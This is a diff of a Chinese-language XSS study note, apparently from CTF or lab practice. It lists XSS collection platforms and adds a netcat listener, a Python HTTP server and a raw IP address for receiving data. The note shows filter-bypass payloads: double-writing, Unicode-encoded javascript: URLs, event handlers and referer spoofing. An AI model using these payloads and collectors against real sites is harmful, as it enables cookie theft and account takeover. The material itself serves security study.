@@ -1,7 +1,11 @@
 [XSS平台 - （支持http/https）XSS Platform](https://xss.pt/xss.php?do=register)
 [xsshs.cn](https://xsshs.cn/)
-bluelotus
 
+nc -lvp 9999    //使用nc监听4444端口
+
+python3 -m http.server 9999
+
+http://8.130.20.254/
 ### 存储型
 存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie
 
@@ -112,29 +116,29 @@ TAB（拿%09的url解码得到的TAB来过滤,或者直接用tab键）
 xss这个词有时候也会被过滤
 ```
 
-![](xss-1.png)
+![](./image/xss-1.png)
 #### 直接用"><script>alert("1")</script>构造闭合
 
-![](xss-2.png)
+![](./image/xss-2.png)
 看到使用了htmlspecialchars方法，htmlspecialchars是将特殊符号转换成HTML实体。HTML为了防止特殊符号，如 "<"等html当成标签<br>
 这时候我们的思路就尽量要绕开使用新标签，那么浏览器还有一些事件可以执行js代码，如onfocus，onblur，(onclick)但是这两个是属于输入框在光标进入/离开时调用后面的js代码<br>
-且需要闭合前面的单引号（也有可能是双引号）
+且需要闭合前面的单引号（也有可能是双引号)
 
-![](xss-3.png)
+![](./image/xss-3.png)
 可以使用a标签来绕过
 
 ### 大小写绕过
 strtolower():将全部换为小写，无法使用大小写绕过
 
 ### 双写绕过
-![](xss-4.png)
+![](./image/xss-4.png)
 因过滤成“”，所以可以使用双写绕过
 " oonnfocus=javascscriptript:alert('xss')//
 "><scscriptript>alert("xss")</scscriptript>//
 "> <a hhrefref=javascscriptript:alert('xss')>xss</a>//
 
 ### Unicode编码绕过
-![](xss-5.png)
+![](./image/xss-5.png)
 href在调用openurl传参时会自动进行unicode解码
 javascript:alert(1)
 &#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&#10;
@@ -146,7 +150,7 @@ t_sort=" type='text' onclick='javascript:alert(1)'//
 
 ## referer绕过
 
-![](xss-6.png)
+![](./image/xss-6.png)
 打开网站后，发现t_ref中内容为上一个网站的内容，于是想到使用referer伪造
 
 ## 获取cookie
